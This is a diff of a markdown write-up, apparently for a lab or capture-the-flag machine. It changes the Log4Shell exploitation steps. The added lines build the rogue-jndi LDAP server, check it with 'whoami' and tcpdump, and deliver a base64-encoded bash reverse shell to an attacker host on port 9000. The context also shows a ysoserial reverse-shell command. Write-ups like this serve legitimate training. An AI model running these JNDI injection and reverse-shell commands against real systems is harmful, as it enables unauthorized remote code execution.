@@ -68,14 +68,35 @@ java -jar ysoserial-modified.jar CommonsCollections3 bash 'bash -i >& /dev/tcp/1
 
 ## Exploitation
 
+
 - Exploit Log4shell vulnerability
 
 ```bash
-git clone https://github.com/kozmer/log4j-shell-poc
+git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
+```
+
+- Check if LDAP server works
+
+```bash
+java -jar RogueJndi-1.1.jar --command 'whoami' --hostname 10.10.16.34
+```
+
+![](/img2/Pasted%20image%2020250319111412.png)
+
+```bash
+tcpdump -i tun0 port 389 -v
+```
+
+![](/img2/Pasted%20image%2020250319111549.png)
+
+- Send reverse shell in base64
+
+```bash
+echo "bash -i >& /dev/tcp/10.10.16.34/9000 0>&1"|base64
 ```
 
 ```bash
-python3 exploit.py -u https://10.129.2.168:8443/ -i 10.10.16.34 -p 9000
+java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMzQvOTAwMCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname 10.10.16.34
 ```
 
 ```bash
